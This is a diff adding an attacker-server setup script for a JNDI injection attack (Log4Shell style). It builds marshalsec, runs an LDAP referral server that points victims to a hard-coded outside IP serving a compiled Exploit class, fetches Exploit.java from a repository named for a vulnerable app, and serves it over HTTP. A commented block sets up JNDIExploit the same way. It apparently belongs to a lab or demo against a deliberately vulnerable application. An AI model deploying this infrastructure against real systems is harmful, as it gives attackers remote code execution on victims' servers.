@@ -1,0 +1,48 @@
+##Attacker server setup - Debian 9
+sudo apt update
+sudo apt install netcat default-jdk dnsutils zip curl unzip nmap maven -Y
+git clone https://github.com/mbechler/marshalsec
+cd marshalsec
+mvn clean package -DskipTests
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://164.92.133.245:8000/#Exploit" &
+mkdir exploit && cd exploit
+wget https://raw.githubusercontent.com/MartinPavelka/DO-vulnApp-DO/main/Exploit.java
+
+
+###### MANUAL PART
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
+python -m SimpleHTTPServer 8000 &
+
+
+
+
+
+
+/***
+*
+*
+*
+*
+*
+*
+unzip JNDIExploit.v1.2.zip
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+echo "export myIP=`dig +short txt ch whoami.cloudflare @1.0.0.1 | awk -F '\"' '{print $2}'`" >> ~/.bashrc
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $myIP -p 8888 &
+*/
+
+
